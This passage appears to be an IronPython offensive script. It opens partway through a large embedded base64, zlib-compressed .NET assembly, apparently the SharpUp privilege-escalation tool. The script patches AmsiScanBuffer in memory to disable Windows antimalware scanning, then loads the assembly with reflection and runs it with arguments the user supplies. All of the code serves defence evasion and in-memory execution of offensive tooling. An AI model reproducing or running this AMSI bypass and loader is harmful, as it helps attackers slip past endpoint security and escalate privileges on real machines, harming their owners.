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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpUp.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()